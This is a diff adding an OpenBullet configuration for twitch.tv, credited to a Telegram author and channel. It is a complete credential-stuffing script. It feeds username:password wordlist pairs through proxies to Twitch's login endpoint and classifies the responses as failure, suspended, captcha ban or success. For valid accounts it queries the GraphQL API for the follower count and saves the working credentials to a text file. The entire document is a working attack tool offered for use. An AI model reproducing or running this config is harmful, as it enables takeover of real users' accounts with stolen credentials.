@@ -1,0 +1,130 @@
+[SETTINGS]
+{
+  "Name": "twitch.tv",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-13T11:39:29.5726495+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1341122482
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#Login REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\",\"undelete_user\":false}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Host: passport.twitch.tv" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Dnt: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password." 
+    KEY "user credentials incorrect" 
+    KEY "user does not exist" 
+  KEYCHAIN Custom "suspended" OR 
+    KEY "This account has been suspended." 
+    KEY "suspended user" 
+  KEYCHAIN Ban OR 
+    KEY "Please complete the CAPTCHA correctly" 
+    KEY "captcha incorrect" 
+  KEYCHAIN Success OR 
+    KEY "captcha_proof\":\"" 
+
+#Post REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"PersonalSections\",\"variables\":{\"input\":{\"sectionInputs\":[\"FOLLOWED_SECTION\",\"RECOMMENDED_SECTION\",\"SIMILAR_SECTION\"],\"recommendationContext\":{\"platform\":\"web\"},\"contextChannelName\":\"<USER>\"},\"channelLogin\":\"<USER>\",\"withChannelUser\":true},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"469efc9442aa2b7634a3ab36eae1778b78ec7ccf062d2b17833afb0e66b78a25\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: 8ZT7EWZ11pKiyzTNRYh27zTw28icZ45t" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Dnt: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#Post REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "{\"variables\":{\"channelID\":\"<id>\"},\"query\":\"query ProfileInfoFromChannelID($channelID: ID!) { user(id: $channelID) { __typename ...ProfileInfoFragment } }fragment ProfileInfoFragment on User { __typename id login displayName description profileImageURL(width: 600) bannerImageURL profileViewCount followers { __typename totalCount } lastBroadcast { __typename startedAt } stream { __typename game { __typename displayName } viewersCount } roles { __typename isPartner } currentUser: self { __typename subscriptionBenefit { __typename id } } panels { __typename ... on DefaultPanel { title linkURL imageURL description } } primaryColorHex ...SubscriptionProductEligibilityFragment channel { __typename socialMedias { __typename ...SocialMediaFragment } } }fragment SubscriptionProductEligibilityFragment on User { __typename subscriptionProducts { __typename offers { __typename eligibility { __typename isEligible } } } }fragment SocialMediaFragment on SocialMedia { __typename id name title url }\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: 8ZT7EWZ11pKiyzTNRYh27zTw28icZ45t" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Dnt: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#followersCount PARSE "<SOURCE>" JSON "totalCount" CreateEmpty=FALSE -> CAP "followersCount" 
+
+#Author_Telegram FUNCTION Constant "https://t.me/Hogo_Victor" -> CAP "Author Telegram" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "twitch.tv.txt" Append "<USER>:<PASS>\\nfollowersCount: <followersCount>\\nAuthor Telegram: https://t.me/Hogo_Victor\\nTelegram Channel:https://t.me/OpenBulletChannel\\n-------------------------------------------------------\\n" -> VAR "Save" 
+
